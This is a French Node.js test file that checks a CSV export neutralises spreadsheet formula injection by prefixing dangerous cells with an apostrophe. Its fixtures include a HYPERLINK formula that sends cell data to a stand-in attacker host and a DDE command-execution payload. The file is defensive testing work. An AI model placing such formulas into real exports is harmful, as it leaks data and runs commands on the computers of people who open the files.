/**
 * Un export CSV ne doit pas se transformer en programme.
 *
 * Un tableur lit toute cellule commencant par « = », « + », « - » ou « @ »
 * comme une FORMULE. Or ces exports transportent des valeurs que
 * l'application n'a pas choisies : un nom lu dans l'annuaire, une direction
 * saisie a l'import, et surtout - dans l'export du journal - l'identifiant
 * tape sur la page de connexion, qui n'exige aucune authentification.
 *
 * N'importe qui pouvait donc deposer « =HYPERLINK(...) » dans le journal et
 * attendre qu'un administrateur ouvre l'export dans Excel. La tabulation et le
 * retour chariot comptent autant : ils sont ignores a la lecture et laissent
 * le caractere suivant en premiere position.
 *
 * La parade retenue est celle de l'OWASP : prefixer la cellule d'une
 * apostrophe, que le tableur consomme.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { baseJetable, nettoyerALaFin } from './base-jetable.mjs';

// src/routes/admin.js charge db.js : sans base jetable, le simple fait de
// chercher la fonction d'echappement ouvrirait la base de production.
baseJetable('csv-formule', import.meta.url);

/**
 * La fonction d'echappement a vocation a vivre dans src/lib/csv.js. Tant
 * qu'elle n'y est pas, elle est dans src/routes/admin.js. On accepte les deux
 * emplacements : ce test porte sur la regle, pas sur le rangement.
 */
async function chargerEchappement() {
  const candidats = ['../src/lib/csv.js', '../src/routes/admin.js'];
  for (const chemin of candidats) {
    let module;
    try {
      module = await import(chemin);
    } catch (e) {
      if (e.code === 'ERR_MODULE_NOT_FOUND') continue;
      throw e;
    }
    const cellule = module.cellule || module.echapper || module.echapperCsv;
    if (cellule) return { cellule, neutraliser: module.neutraliserFormule || null, csv: module.csv || null };
  }
  assert.fail(
    "aucune fonction d'echappement CSV exportee : cherchee dans src/lib/csv.js "
    + '(cellule / neutraliserFormule) puis dans src/routes/admin.js. Tant qu'
    + "qu'elle n'est pas exportee, la neutralisation des formules n'est pas testable."
  );
}

const { cellule, neutraliser, csv } = await chargerEchappement();
const { db } = await import('../src/lib/db.js');
nettoyerALaFin(db);

/** Texte de la cellule tel que le tableur le recevra, guillemets d'enrobage retires. */
const contenu = (valeur) => {
  const s = cellule(valeur);
  return /^".*"$/s.test(s) ? s.slice(1, -1).replace(/""/g, '"') : s;
};

const DANGEREUX = [
  ['=', '=HYPERLINK("http://pirate.example/vol?d="&A1,"Facture")', 'formule de fuite de donnees'],
  ['+', '+1+1', 'addition, formule pour Excel'],
  ['-', '-2+3', 'soustraction, formule pour Excel'],
  ['@', '@SUM(1:1)', 'appel de fonction en notation Lotus'],
  ['tabulation', '\t=1+1', 'la tabulation est ignoree : « = » se retrouve en tete'],
  ['retour chariot', '\r=1+1', 'le retour chariot est ignore : « = » se retrouve en tete'],
];

for (const [nom, valeur, pourquoi] of DANGEREUX) {
  test(`une cellule commencant par « ${nom} » est neutralisee`, () => {
    const sortie = contenu(valeur);
    assert.ok(sortie.startsWith("'"),
      `${pourquoi} - la cellule doit etre prefixee, or elle sort telle quelle : ${JSON.stringify(sortie)}`);
    assert.equal(sortie.slice(1), valeur, 'le contenu doit rester lisible, seulement prefixe');
  });
}

test('une cellule ordinaire n est pas abimee', () => {
  // Une neutralisation trop large rendrait tous les exports illisibles.
  for (const valeur of ['Sophie LEROY', 'Population & Citoyenneté', '42', 'p.martin@ville.fr']) {
    assert.equal(contenu(valeur), valeur, `« ${valeur} » n'a aucune raison d'etre prefixee`);
  }
});

test('un caractere dangereux au milieu ne declenche rien', () => {
  // Seul le PREMIER caractere compte pour le tableur.
  assert.equal(contenu('Budget = 12 000 €'), 'Budget = 12 000 €');
  assert.equal(contenu('Jean-Luc MARTIN'), 'Jean-Luc MARTIN');
});

test('le vide et l absence de valeur restent vides', () => {
  for (const valeur of [null, undefined, '']) assert.equal(contenu(valeur), '');
});

test('la neutralisation ne remplace pas l echappement des guillemets', () => {
  // Les deux regles se cumulent : sans guillemets doubles, le point-virgule
  // d'une cellule prefixee decalerait toute la ligne.
  const sortie = cellule('=1;2"3');
  assert.ok(sortie.startsWith('"') && sortie.endsWith('"'),
    'une cellule contenant un point-virgule doit etre enrobee de guillemets');
  assert.equal(contenu('=1;2"3'), '\'=1;2"3');
});

test('la ligne est enrobee quand la cellule a ete prefixee', () => {
  // Une apostrophe de tete nue serait parfois reinterpretee : l'enrobage la
  // protege dans tous les tableurs.
  assert.equal(cellule('=1+1'), '"\'=1+1"');
});

test("un identifiant de connexion hostile n'atteint pas le tableur", {
  skip: csv ? false : 'la construction complete du CSV n\'est pas exportee',
}, () => {
  // Le cas reel : le journal enregistre le login tape sur la page de
  // connexion, qui n'est soumis a aucune authentification.
  const sortie = csv(
    [{ login: '=cmd|\'/c calc\'!A1', action: 'connexion_refusee' }],
    ['login', 'action']
  );
  assert.ok(!/(^|;|\n)=/.test(sortie),
    `aucune cellule ne doit commencer par « = » dans le fichier produit :\n${sortie}`);
  assert.ok(sortie.includes("'=cmd"), 'la valeur doit rester lisible, simplement prefixee');
});

test("neutraliserFormule, si elle est exportee, applique la meme regle", {
  skip: neutraliser ? false : 'fonction non exportee separement',
}, () => {
  for (const [, valeur] of DANGEREUX) {
    assert.equal(neutraliser(valeur), `'${valeur}`);
  }
  assert.equal(neutraliser('Sophie LEROY'), 'Sophie LEROY');
});
